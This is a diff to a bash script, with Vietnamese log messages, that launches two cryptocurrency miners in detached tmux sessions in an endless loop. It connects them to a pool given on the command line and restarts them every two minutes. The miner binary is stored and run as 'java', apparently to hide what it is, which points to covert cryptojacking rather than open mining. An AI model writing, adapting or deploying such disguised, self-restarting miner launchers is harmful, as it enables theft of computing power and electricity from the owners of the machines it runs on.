@@ -1,6 +1,8 @@
 #!/bin/bash
 
-SESSION="java"
+SESSION1="java1"
+SESSION2="java2"
+
 DOMAIN="$1"
 NAME_WORK="$2"
 
@@ -35,15 +37,26 @@ fi
 echo "[+] Vòng lặp ..."
 while true; do
     pkill -f "$(pwd)/java/java" 2>/dev/null
-    echo "[+] kill process kill process kill process - sleep 5s..."
-    sleep 7
+    echo "[+] Kill process - sleep 10s..."
+    sleep 10
 
-    tmux kill-session -t $SESSION 2>/dev/null
-    echo "[+] run process - sleep 5 phút..."
-    tmux new-session -s $SESSION -d
-    tmux send-keys -t $SESSION "
-        $(pwd)/java/java -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
+    tmux kill-session -t $SESSION1 2>/dev/null
+    tmux kill-session -t $SESSION2 2>/dev/null
+
+    echo "[+] Start 2 miners - sleep 5 phút..."
+    
+    # Miner 1
+    tmux new-session -s $SESSION1 -d
+    tmux send-keys -t $SESSION1 "
+        $(pwd)/java/java -o $DOMAIN --tls -k -t 3 --rig-id ${NAME_WORK}-1
     " C-m
-    echo "[+] start process start process start process - sleep 120s..."
+
+    # Miner 2
+    tmux new-session -s $SESSION2 -d
+    tmux send-keys -t $SESSION2 "
+        $(pwd)/java/java -o $DOMAIN --tls -k -t 4 --rig-id ${NAME_WORK}-2
+    " C-m
+
+    echo "[+] Both miners started - sleep 120s..."
     sleep 120
 done
